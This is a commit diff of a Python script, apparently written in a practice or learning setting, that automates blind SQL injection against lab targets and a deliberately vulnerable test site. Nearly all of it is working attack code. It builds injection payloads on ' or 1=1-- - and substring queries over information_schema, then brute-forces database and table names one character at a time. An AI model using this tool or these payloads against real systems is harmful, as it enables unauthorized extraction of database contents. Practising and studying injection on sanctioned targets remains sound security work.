9240153e22348b5a3efd2aa0c2223ff4bf79dd35
Llanyro <Llanyro@gmail.com>
2020-03-05 10:57:11 +0100

    Update SQLInjector.py

--- SQLInjector.py
+++ SQLInjector.py
@@ -1,19 +1,33 @@
 import requests
+from enum import Enum
 
-a = "http://192.168.0.101/sqli/example1.php?name=root' or substring((select schema_name from information_schema.schemata limit 0,1),1,1)='m'-- -"
-b = "http://192.168.0.101/sqli/example1.php?name=' or 1 = 1-- -"
+a = "http://10.1.200.158/sqli/example1.php?name=root' or substring((select schema_name from information_schema.schemata limit 0,1),1,1)='m'-- -"
+b = "http://10.1.200.158/sqli/example1.php?name=root' or substring((select table_name from information_schema.tables limit 0,1),1,1)='m'-- -"
+c = "http://10.1.200.158/sqli/example1.php?name=' or 1 = 1-- -"
+
+
+class DataBaseOptions(Enum):
+    databases = 0
+    tables = 1
+    content = 2
 
 
 # Busca en la base de datos a partir de una inyeccion correcta
 class SQLInjector:
     # region Constantes
-    __entrada: str = "http://192.168.0.101/sqli/example1.php?name=root"
+    """__ip: str = "10.1.200.158"
+    __entrada: str = "http://" + __ip + "/sqli/example1.php?name=root"""
+    __entrada: str = "http://testphp.vulnweb.com/listproducts.php?cat=1"
     __caracteres: str = 'abcdefghijklmnñopqrstuvwxyz0123456789_$,'
     __colaLinea: str = "'or 1=1-- -"
     __colaLineaError: str = "'and 1=0-- -"
     __cola: str = "'-- -"
     __parametroDivisor: str = "PARAM"
-    __tochoComparador1: str = "' or substring((select schema_name from information_schema.schemata limit "
+    __busqurdaDataBase: str = "select schema_name from information_schema.schemata"
+    __busquedaTables: str = "select table_name from information_schema.tables"
+    # __tochoComparador0: str = "' or substring(("
+    __tochoComparador0: str = " or substring(("
+    __tochoComparador1: str = " limit "
     __tochoComparador2: str = ",1),1,"
     __tochoComparador3: str = ")='"
     # endregion
@@ -27,10 +41,20 @@ class SQLInjector:
         self.__resultadoPositivo = requests.get(url=self.__entrada).content
         self.__iniciado = True
 
-    def __buscarBasesDeDatos(self, fila: int, string: str):
-        lineatemporal = self.__entrada + self.__tochoComparador1 + str(fila) + \
-                        self.__tochoComparador2 + str(string.__len__() + 1) + \
-                        self.__tochoComparador3 + string
+    def __generarString(self, fila: int, string: str, type: DataBaseOptions):
+        if type == DataBaseOptions.databases:
+            result = self.__entrada + self.__tochoComparador0 + self.__busqurdaDataBase + self.__tochoComparador1 + \
+               str(fila) + self.__tochoComparador2 + str(string.__len__() + 1) + self.__tochoComparador3 + string
+        elif type == DataBaseOptions.tables:
+            result = self.__entrada + self.__tochoComparador0 + self.__busquedaTables + self.__tochoComparador1 + \
+                str(fila) + self.__tochoComparador2 + str(string.__len__() + 1) + self.__tochoComparador3 + string
+        else:
+            result = self.__entrada + self.__tochoComparador0 + self.__busqurdaDataBase + self.__tochoComparador1 + \
+               str(fila) + self.__tochoComparador2 + str(string.__len__() + 1) + self.__tochoComparador3 + string
+        return result
+
+    def __buscarBases(self, fila: int, string: str, type: DataBaseOptions):
+        lineatemporal = self.__generarString(fila=fila, string=string, type=type)
         lista: list = []
         for caracter in self.__caracteres:
             urldetrabajo = lineatemporal + caracter + self.__cola
@@ -38,36 +62,38 @@ class SQLInjector:
             result = requests.get(url=urldetrabajo)
             if result.content != self.__resultadoPositivo:
                 lista.append(caracter)
+                break
         if lista.__len__() > 0:
-            string = self.__buscarBasesDeDatos(fila, string + lista[0])
+            string = self.__buscarBases(fila, string + lista[0], type)
         return string
 
-    # Si todo se ha realizado con exito esto devolvera True
+    # Si se ha inicializado con exito esto devolvera True
     def getIniciado(self):
         return self.__iniciado
 
-    def buscarBlind(self):
+    def buscarBlind(self, type: DataBaseOptions):
         resultado: list = []
         if self.__iniciado is True:
             retorno: str = ""
             posicion: int = 0
             while retorno.__len__() > 0 or posicion == 0:
-                retorno = self.__buscarBasesDeDatos(posicion, "")
+                retorno = self.__buscarBases(posicion, "", type)
                 posicion += 1
-                resultado.append(retorno)
+                if retorno.__len__() > 0:
+                    resultado.append(retorno)
         return resultado
 
 
 s = SQLInjector("")
-print(s.buscarBlind())
+print(s.buscarBlind(DataBaseOptions.tables))
+# print(s.generarStringDataBase(0, "mysql"))
+
 """
 for value in urldividida:
     if value .__len__() > 0:
         print(value)
     else:
         print("Contenido vacio")
-
-
 urlBuena = "http://192.168.0.101/sqli/example1.php?name=root'and 1=1-- -"
 """
 """
